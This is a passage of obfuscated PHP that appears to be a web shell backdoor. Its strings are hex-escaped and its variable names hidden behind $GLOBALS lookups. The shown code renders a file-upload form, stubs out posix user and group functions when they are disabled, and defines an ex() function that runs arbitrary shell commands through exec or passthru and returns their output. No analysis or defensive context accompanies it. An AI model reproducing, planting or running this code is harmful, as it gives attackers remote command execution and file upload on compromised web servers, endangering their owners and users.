mlspecialchars($GLOBALS["\x63wd"]);echo "'\x3e\n\t\t<\x69\x6ep\x75t ty\x70e=hid\x64\x65n \x6eame=p1\x20\x76\x61\x6c\x75\x65=\x27u\x70\x6c\x6f\x61d\x46\x69l\x65'\x3e\n\t\t\x3cin\x70u\x74\x20t\x79pe\x3dhid\x64en\x20nam\x65\x3d\x63h\x61\x72\x73\x65t\x20v\x61\x6c\x75\x65=\x27";echo isset($_POST["\x63\x68ars\x65\x74"])?$_POST["ch\x61\x72\x73et"]:"";echo "'\x3e\n\t\t<sp\x61\x6e>U\x70l\x6f\x61d f\x69\x6ce:\x3c/\x73\x70an\x3e\x3c\x62r\x3e\x3ci\x6e\x70\x75\x74\x20c\x6c\x61\x73s=\x22\x74o\x6f\x6c\x73\x49\x6ep\x22\x20\x74y\x70\x65=fi\x6ce \x6eam\x65=f>\x3c\x69n\x70u\x74 \x74\x79p\x65\x3d\x73\x75\x62mi\x74 \x76\x61\x6cu\x65\x3d\x22\x3e>\">\x3c/\x66o\x72m\x3e";echo ${${"\x47\x4cOB\x41\x4c\x53"}["rsc\x70\x79\x79\x70l\x69xk"]};echo "</\x74d>\n\t</tr>\n\n</\x74ab\x6ce\x3e\n\x3c/div>\n</b\x6fd\x79\x3e\x3c/\x68t\x6d\x6c>\n";}if(!function_exists("p\x6fs\x69x_getpw\x75i\x64")&&(strpos($GLOBALS["disa\x62\x6ce\x5f\x66\x75\x6ec\x74\x69\x6f\x6es"],"\x70\x6f\x73\x69x_g\x65t\x70\x77ui\x64")===false)){function posix_getpwuid($p){return false;}}if(!function_exists("p\x6f\x73ix_\x67e\x74g\x72\x67i\x64")&&(strpos($GLOBALS["disab\x6c\x65_\x66\x75\x6e\x63\x74\x69o\x6e\x73"],"p\x6f\x73i\x78\x5fg\x65\x74g\x72gi\x64")===false)){function posix_getgrgid($p){return false;}}function ex($in){${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6a\x66\x67sy\x71y\x6ber\x62"]}="";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6a\x70\x64\x77\x79g\x72\x78"]="\x69\x6e";if(function_exists("\x65\x78ec")){${"\x47\x4c\x4f\x42\x41LS"}["\x77\x6br\x71\x6b\x6d\x61q\x78y"]="\x6f\x75\x74";@exec(${${"GL\x4f\x42\x41\x4c\x53"}["\x79\x67\x6dol\x76\x68\x68\x71"]},${${"\x47\x4c\x4fBA\x4c\x53"}["j\x66\x67\x73yq\x79\x6b\x65r\x62"]});${${"GL\x4f\x42AL\x53"}["\x6a\x66\x67\x73y\x71\x79\x6be\x72\x62"]}=@join("\n",${${"G\x4c\x4f\x42A\x4c\x53"}["w\x6b\x72\x71\x6bma\x71x\x79"]});}elseif(function_exists("p\x61\x73\x73t\x68\x72\x75")){$bnfjbutf="\x6f\x75t";ob_start();@passthru(${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x79\x67\x6do\x6c\x76\x68hq"]});${$bnfjbutf}=ob_get